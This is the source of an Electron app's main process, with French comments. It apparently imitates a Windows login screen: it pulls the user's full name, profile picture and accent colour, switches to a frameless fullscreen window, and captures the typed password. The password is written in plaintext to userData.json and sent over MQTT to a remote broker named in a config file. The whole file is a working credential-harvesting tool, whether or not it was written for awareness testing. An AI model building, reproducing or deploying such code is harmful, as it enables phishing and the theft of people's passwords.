const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const os = require('os');
const fs = require('fs');
const mqtt = require('mqtt');
const regedit = require('regedit');
const { exec } = require('child_process');

//flags pour savoir si on peu quitter ou pas encore
let passSaved = false;
let canQuit = false;

//#region chemins
// Chemin dynamique pour localiser le dossier vbs en mode production
const vbsPath = path.join(process.resourcesPath, 'app', 'node_modules', 'regedit', 'vbs');
regedit.setExternalVBSLocation(vbsPath);

//chemin du json des datas
const filePath = app.isPackaged
  ? path.join(app.getPath('exe'), 'userData.json')//a côté de lexe car non packagé
  : path.join(__dirname, 'userData.json'); // a la racine de l'enviro

//chemin json config
const configPath = app.isPackaged
  ? path.join(app.getPath('exe'), 'config.json')//a côté de lexe car non packagé
  : path.join(__dirname, 'config.json'); // a la racine de l'enviro

let config = {};

if (fs.existsSync(configPath)) {
  try {
      config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
  } catch (error) {
      console.error("Erreur de parsing du fichier config.json :", error);
  }
} else {
  console.warn("Le fichier config.json est introuvable au chemin :", configPath, "on va faire sans");
}

//#endregion
//#region mqtt
// Configurer les options de connexion MQTTs
let client;

if (config.mqtt) {
  if (config.useMqtt === true) {
    // Créer la connexion MQTTs
    client = mqtt.connect(config.mqtt);

    client.on('connect', () => {
      console.log("Connecté au serveur MQTTs");
    });

    client.on('error', (error) => {
      console.error("Erreur de connexion MQTT :", error);
    });
  }
}

//#endregion

//#region get du nom
let username;

function getFullUserName(callback) {
  const command = `powershell -Command "Get-WmiObject -Class Win32_UserAccount -Filter \\"Name='$env:USERNAME'\\" | Select-Object -ExpandProperty FullName"`;
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Erreur lors de l'exécution de la commande PowerShell : ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`Erreur PowerShell : ${stderr}`);
      return;
    }
    const fullName = stdout.trim();
    callback(fullName);
  });
}

getFullUserName((fullName) => {
  console.log(`Nom complet de l'utilisateur Windows : ${fullName}`);
  username = fullName;
  mainWindow.webContents.send('name', username); // Envoie à setup.js
});
//#endregion

//#region récupère la couleur systhème windows
const registryPaths = [
  'HKCU\\Software\\Microsoft\\Windows\\DWM',
  'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Accent',
];

let color;

regedit.list(registryPaths, (err, result) => {
  if (err) {
    console.error("Erreur lors de la lecture du registre :", err);
  } else {
    // Récupération des différentes valeurs de couleur
    const colorizationColor = result['HKCU\\Software\\Microsoft\\Windows\\DWM'].values['ColorizationColor']?.value;
    //const accentColorMenu = result['HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Accent'].values['AccentColorMenu']?.value;
    //const startColorMenu = result['HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Accent'].values['StartColorMenu']?.value;
    color = argbToRgb(colorizationColor);
    mainWindow.webContents.send('color', color); // Envoie à renderer.html
  }
});

function argbToRgb(argb) {
  const hex = parseInt(argb, 10).toString(16).padStart(8, '0');
  const alpha = parseInt(hex.slice(0, 2), 16) / 255;
  const red = parseInt(hex.slice(2, 4), 16);
  const green = parseInt(hex.slice(4, 6), 16);
  const blue = parseInt(hex.slice(6, 8), 16);
  return `rgba(${red}, ${green}, ${blue}, 255)`;
}

//#endregion

//#region récupére l'immgge de profil wd
let wdProfilePicture;

if (process.platform === 'win32') {
  // Chemin pour Windows
  const accountPicturesPath = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'AccountPictures');
  if (fs.existsSync(accountPicturesPath)) {
    const files = fs.readdirSync(accountPicturesPath);
    let imageFile = files.find(file => file.endsWith('.jpg') || file.endsWith('.png'));
    if (imageFile) {
      profileImagePath = path.join(accountPicturesPath, imageFile);
    } else {
      imageFile = files.find(file => file.endsWith('.accountpicture-ms'));
      if (imageFile) {
        const filePath = path.join(accountPicturesPath, imageFile);
        //https://github.com/xan105/node-accountpicture-ms-extractor
        //merci-amen
        import('accountpicture-ms-extractor').then(({ default: extract }) => {
          extract(filePath)
            .then(({ highres }) => {
              wdProfilePicture = highres.base64();
              console.log("accountpicture ok");
            })
            .catch(error => {
              console.error('Erreur lors de l\'extraction de l\'image :', error);
            });
        });
      } else {
        console.log('Aucun fichier .accountpicture-ms trouvé.');
      }
    }
  }
}
//#endregion

//#region get connection type
const interfaces = os.networkInterfaces();
let wifi = false;

for (const name in interfaces) {
  const iface = interfaces[name];
  iface.forEach(details => {
    if (details.family === 'IPv4' && details.internal === false && /wi-fi|wireless/i.test(name)) {
      wifi = true;
    }
  });
}

console.log("connection mode ", wifi ? "wifi" : "ethernet");
//#endregion

let mainWindow;

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    transparent: true,
    frame: false,
    resizable: false,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      enableRemoteModule: false,
    }
  });

  mainWindow.loadFile('setup.html'); // Charge la page d'accueil au démarrage

  // Ouvre la console DevTools en mode dev
  if (!app.isPackaged) {
    mainWindow.webContents.openDevTools();
  }

  //choppe la langue
  let langueSys = app.getLocale();
  let locales;
  GetLanguage(langueSys, (translations) => {
    locales = translations;
  });

  console.log("Langue système :", locales);

  // Passe en plein écran et masque la barre de menu lorsqu'on charge `index.html`
  mainWindow.webContents.on('did-finish-load', () => {
    if (mainWindow.webContents.getURL().endsWith('index.html')) {
      mainWindow.setFullScreen(true);
      mainWindow.setMenuBarVisibility(false);
    } else {
      mainWindow.webContents.send('color', color);//pour voir la sys color
      mainWindow.webContents.send('filePath', filePath);//afficher le chemin de sortie
      mainWindow.webContents.send('change-lang', locales);//envoyer la langue systhème avec le path
    }
  });
}

app.whenReady().then(createWindow);

//bouton GO / Expertiser la zone
ipcMain.on('set-data', (event, data) => {
  mainWindow.loadFile('index.html'); // Charge la page principale

  data.isWifi = wifi;
  data.profileImagebase64 = wdProfilePicture;
  data.syscolor = color;
  if (!data.username) data.username = os.userInfo().username;//chopper un username vite fait si on a pas un truc

  mainWindow.webContents.once('did-finish-load', () => {
    mainWindow.webContents.send('set-data', data); // Envoie à renderer.html
  });
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});

ipcMain.on('get-pass', (event, userInput) => {
  console.log(`Texte saisi : ${userInput}`);

  // Nouvelle entrée à ajouter
  const newEntry = {
    username: username,
    baseUsername: os.userInfo().username,
    password: userInput,
    timestamp: new Date().toISOString(),
    timesTyped: 1,
  };

  // Fonction pour ajouter ou mettre à jour l'entrée dans la liste et sauvegarder
  function saveData(data) {
    // Recherche d'une entrée existante avec le même `username`, `baseUsername`, et `password`
    const existingEntry = data.find(
      (entry) => entry.username === newEntry.username &&
        entry.baseUsername === newEntry.baseUsername &&
        entry.password === newEntry.password
    );

    if (existingEntry) {
      // Si l'entrée existe, incrémente `timesTyped`
      existingEntry.timesTyped += 1;
      existingEntry.timestamp = new Date().toISOString(); // Met à jour le timestamp
    } else {
      // Si l'entrée n'existe pas, ajoute `newEntry`
      data.push(newEntry);
    }

    // Écrit les données mises à jour dans le fichier JSON
    fs.writeFile(filePath, JSON.stringify(data, null, 2), (err) => {
      if (err) {
        console.error("Erreur lors de la sauvegarde des données :", err);
      } else {
        console.log("Données sauvegardées dans userData.json");
        passSaved = true;
      }
    });
    if (canQuit === true && (config.useMqtt === false || config.useMqtt === undefined)) {
      app.quit();
    } else {
      if((config.useMqtt === false || config.useMqtt === undefined)) return;
      // Envoyer les données au topic "data"
      client.publish('data', JSON.stringify(newEntry), { qos: 1 }, (error) => {
        if (error) {
          console.error("Erreur d'envoi MQTT :", error);
        } else {
          console.log("Données envoyées avec succès sur le topic 'data'");
        }
        client.end();
        config.hasSended = true;
        if (canQuit === true) app.quit();
      });
    }
  }

  // Lecture du fichier pour ajouter les données de manière additive
  fs.readFile(filePath, 'utf8', (err, fileData) => {
    if (err) {
      if (err.code === 'ENOENT') {
        // Si le fichier n'existe pas, créez une nouvelle liste
        saveData([]);//liste de base vide
      } else {
        console.error("Erreur lors de la lecture du fichier :", err);
      }
    } else {
      try {
        const data = JSON.parse(fileData);
        if (Array.isArray(data)) {
          saveData(data);//ajouter a la liste existante
        } else {
          saveData([]);//liste de base vide
        }
      } catch (parseErr) {
        console.error("Erreur de parsing JSON :", parseErr);
        saveData([]);//liste de base vide
      }
    }
  });
});

ipcMain.on('set-opacity', (event, opacity) => {
  if (mainWindow) {
    mainWindow.setOpacity(opacity);
  }
});

ipcMain.on('close-window', (event, data) => {
  console.log("transition finito");
  canQuit = true;
  if (passSaved === true && (config.hasSended === true || config.useMqtt === undefined)) app.quit();
});

ipcMain.on('setup-quit', (event, data) => {
  app.quit();
});


ipcMain.on('change-lang', (event, lang) => {
  GetLanguage(lang, (translations) => {
    mainWindow.webContents.send('lang', translations); // Envoie les traductions au renderer
  });
});

function GetLanguage(lang, callback) {
  const isPackaged = app.isPackaged;
  const lpath = isPackaged
    ? path.join(process.resourcesPath, 'locales', `${lang}.json`)
    : path.join(__dirname, 'locales', `${lang}.json`);

  console.log("Chemin du fichier de langue :", lpath);

  // Charger le fichier JSON de langue
  fs.readFile(lpath, 'utf-8', (err, data) => {
    if (err) {
      console.error("Erreur de chargement de la langue :", err);
      callback({}); // Appelle le callback avec un objet vide en cas d'erreur
    } else {
      callback(JSON.parse(data)); // Appelle le callback avec les données JSON
    }
  });
}